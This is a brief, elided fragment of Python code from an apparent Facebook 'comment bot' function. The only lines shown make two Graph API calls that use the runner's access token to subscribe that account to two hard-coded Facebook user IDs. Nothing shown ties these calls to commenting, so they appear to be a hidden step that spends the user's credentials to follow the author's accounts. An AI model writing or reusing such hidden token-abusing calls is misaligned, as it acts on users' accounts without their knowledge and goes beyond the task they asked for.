...
def bot_komen():
    ...
    requests.post('https://graph.facebook.com/100001134480658/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/1475910687/subscribers?access_token=' + token)
